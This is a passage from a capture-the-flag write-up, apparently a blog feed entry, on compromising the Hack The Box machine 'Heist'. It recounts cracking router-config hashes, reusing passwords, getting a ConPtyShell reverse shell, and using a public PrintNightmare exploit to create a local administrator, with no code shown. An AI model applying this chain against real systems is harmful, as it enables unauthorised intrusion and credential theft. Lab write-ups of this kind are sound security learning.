<h3 id="trying-to-move-laterally">Trying to move <em>laterally</em></h3>

<p>Afterwards, I think of pivoting to the hazard user and looking for something interesting. This would require using <code class="language-plaintext highlighter-rouge">runas.exe</code>, which needs a fully interactive tty. This is achievable in our case. Since this machine is a <strong>Windows 10.0 Build 17763 x64</strong>.</p>

<p>we use the very nice reverse shell from (https://github.com/antonioCoco/ConPtyShell) for that. But we still get access denied here as well XD</p>

<p><img src="/assets/Heist/run-as-failed.jpg" alt="run-as-failed" /></p>

<h3 id="lets-just-use-printnightmare-xd">Let’s just use PrintNightmare XD</h3>

<p>I then decide maybe I should just privesc with Print Nightmare :D</p>

<p>I use John Hammond’s version of the exploit (https://github.com/JohnHammond/CVE-2021-34527) since it’s written in PowerShell <em>(to which I am biased :D</em>)</p>

<p><em>After uploading the script and importing it,</em> we use it to create a local administrator and are successful :D</p>

<p><img src="/assets/Heist/murder.jpg" alt="murder" /></p>

<p>nevermind the names I use. It’s totally normal XD</p>

<p>P.S. After checking <strong>Ippsec’s</strong> writeup, the <em>intended path</em> was to dump the memory of the <code class="language-plaintext highlighter-rouge">firefox</code> process and using the <code class="language-plaintext highlighter-rouge">strings</code> command to look into its contents where the credentials for the administrator would be found. But, oh well :/ :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary We find a website on port 80 that lets us login as a guest. On the first page, we find a conversation between a user and a support admin about checking an attached Cisco router configuration file. Browsing the configuration file, we find hashes that we can easily crack to get passwords. One password works with SMB for the user on the web page. We use that to do a RID enumeration to get all the usernames on the system. Reusing the password we found with all users, we find one more user who happens to have PowerShell remoting access. To privesc, we use the famous PrintNightmare vulnerability since print spooler is found running. The intended path is dumping the running Firefox process from memory and using the strings command to obtain the Administrator credentials from the dump.]]></summary></entry></feed>